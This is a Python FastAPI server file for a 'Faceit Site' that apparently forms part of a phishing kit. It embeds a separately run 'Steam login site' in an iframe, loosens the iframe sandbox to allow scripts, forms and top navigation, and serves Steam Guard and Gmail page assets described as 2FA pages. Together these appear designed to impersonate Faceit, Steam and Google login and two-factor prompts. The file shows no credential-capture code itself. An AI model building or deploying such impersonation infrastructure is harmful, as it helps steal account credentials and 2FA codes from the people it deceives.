import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import uvicorn
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

FACEIT_DIR = Path(__file__).resolve().parent
LOGIN_DIR = FACEIT_DIR.parent / "Login"

app = FastAPI(title="Faceit Site")


@app.get("/", include_in_schema=False)
async def serve_index():
    html = (FACEIT_DIR / "index.html").read_text(encoding="utf-8")
    # point iframe to Steam login site (8001) with proper permissions
    html = html.replace('src="Login/Login.html"', 'src="http://127.0.0.1:8001/"')
    html = html.replace("src='Login/Login.html?preview='+Date.now()", "src='http://127.0.0.1:8001/?preview='+Date.now()")
    html = html.replace('sandbox="allow-same-origin"', 'sandbox="allow-scripts allow-forms allow-same-origin allow-top-navigation"')
    return HTMLResponse(html, headers={"Content-Type": "text/html; charset=utf-8"})


# Mount static directories
Login_files_path = FACEIT_DIR / "Login" / "Login_files"
if Login_files_path.exists():
    app.mount("/Login/Login_files", StaticFiles(directory=str(Login_files_path)), name="faceit_login_files")

images_path = FACEIT_DIR / "images"
if images_path.exists():
    app.mount("/images", StaticFiles(directory=str(images_path)), name="faceit_images")

# Guard/Gmail files from original Login directory (for 2FA pages loaded in iframe)
Guard_files_path = LOGIN_DIR / "Guard_files"
if Guard_files_path.exists():
    app.mount("/Guard_files", StaticFiles(directory=str(Guard_files_path)), name="faceit_guard_files")

Gmail_files_path = LOGIN_DIR / "Gmail_files"
if Gmail_files_path.exists():
    app.mount("/Gmail_files", StaticFiles(directory=str(Gmail_files_path)), name="faceit_gmail_files")

app.mount("/static", StaticFiles(directory=str(FACEIT_DIR)), name="faceit_static")
# serve other root-level static files (icons, etc.)
app.mount("/", StaticFiles(directory=str(FACEIT_DIR)), name="faceit_root")


if __name__ == "__main__":
    port = 8002
    print(f"\n  Faceit Site: http://127.0.0.1:{port}\n")
    uvicorn.run("Faceit.main:app", host="127.0.0.1", port=port, reload=True)
